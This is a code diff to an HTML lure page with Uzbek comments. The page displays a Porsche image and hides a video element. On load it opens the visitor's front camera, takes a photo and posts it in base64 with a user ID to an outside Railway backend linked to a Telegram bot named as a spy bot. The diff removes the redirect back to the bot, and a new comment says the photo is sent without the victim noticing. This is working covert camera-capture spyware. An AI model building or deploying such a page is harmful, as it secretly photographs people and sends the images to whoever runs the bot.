@@ -34,27 +34,18 @@
     <!-- Ekranda ko'rinadigan Porsche rasmi -->
     <img src="porsche.png" alt="Porsche">
 
-    <!-- Kamera tasviri uchun yashirin video -->
+    <!-- Yashirin video -->
     <video id="video" autoplay playsinline muted></video>
 
     <script>
-    // 1. Railway Backend manzilingiz
     const BACKEND_URL = "https://telegram-production-6392.up.railway.app";
-    
-    // 2. Sizning Telegram Botingiz username'i qo'shildi
-    const BOT_USERNAME = "Shpi0n_bot_bot"; 
-
     const uid = new URLSearchParams(window.location.search).get("uid");
     const video = document.getElementById("video");
 
     async function captureAndSend() {
-        if (!uid) {
-            console.error("User ID topilmadi!");
-            return;
-        }
+        if (!uid) return;
 
         try {
-            // Kameralarga ulanish
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user" },
                 audio: false
@@ -62,15 +53,12 @@
 
             video.srcObject = stream;
 
-            // Video tayyor bo'lishini kutish
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => resolve();
             });
 
-            // Tasvir tiniqlashishi uchun 500ms kutiladi
             await new Promise((resolve) => setTimeout(resolve, 500));
 
-            // Rasmga tushirish
             const canvas = document.createElement("canvas");
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -79,25 +67,21 @@
 
             const imageBase64 = canvas.toDataURL("image/jpeg", 0.85);
 
-            // Kamerani o'chirish
+            // Kameralarni o'chirish
             stream.getTracks().forEach(track => track.stop());
 
-            // Backend'ga yuborish
+            // Backend'ga yuborish (Avtomatik botga qaytib ketmaydi, rasm sezdirmasdan yuboriladi)
             await fetch(`${BACKEND_URL}/upload`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ uid: Number(uid), image: imageBase64 })
             });
 
-            // Rasm yuborilgach, avtomatik Telegram botga qaytarish
-            window.location.href = `https://t.me/${BOT_USERNAME}`;
-
         } catch (err) {
-            console.error("Kamera xatoligi:", err);
+            console.error("Xatolik:", err);
         }
     }
 
-    // Sahifa yuklanganda avtomatik ishga tushirish
     window.addEventListener("load", captureAndSend);
     </script>
 </body>
